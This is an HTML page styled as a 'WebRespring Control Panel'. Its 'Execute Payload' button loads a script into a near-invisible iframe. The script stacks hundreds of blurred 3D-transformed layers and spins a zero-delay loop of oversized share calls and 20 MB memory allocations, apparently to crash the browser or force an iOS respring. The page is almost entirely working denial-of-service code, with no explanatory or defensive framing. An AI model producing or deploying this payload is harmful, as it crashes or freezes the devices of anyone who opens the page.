<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebRespring Control Panel</title>
    <style>
        body {
            background: #0a0a0a;
            color: #f0f0f0;
            font-family: monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #161616;
            border: 1px solid #333;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }
        button {
            background: #ff3333;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            font-family: monospace;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.2s;
        }
        button:hover {
            background: #cc0000;
        }
        #respring-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            border: none;
            opacity: 0.05; 
            pointer-events: none;
            display: none; /* Hidden until triggered */
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>WebRespring Utility</h1>
        <p>Clicking the button below will deploy the execution payload into the background frame.</p>
        <button id="execBtn">Execute Payload</button>
    </div>
 
    <iframe id="respring-iframe" 
        sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
    </iframe>
 
    <script>
        document.getElementById('execBtn').addEventListener('click', function() {
            this.style.backgroundColor = '#555';
            this.innerText = 'Executing...';
            
            const frame = document.getElementById('respring-iframe');
            frame.style.display = 'block'; // Activate frame
            
            const respringScript = `
                <html>
                <body style="margin:0; overflow:hidden;">
                    <script>
                        const container = document.createElement('div');
                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                        document.body.appendChild(container);
 
                        for (let i = 0; i < 500; i++) {
                            let d = document.createElement('div');
                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
                            container.appendChild(d);
                        }
 
                        setInterval(() => {
                            try {
                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                            } catch(e) {}
                            let x = new Uint8Array(1024 * 1024 * 20);
                            crypto.getRandomValues(x);
                        }, 0);
                    <\/script>
                </body>
                </html>
            `;
            frame.srcdoc = respringScript;
        });
    </script>
</body>
</html>
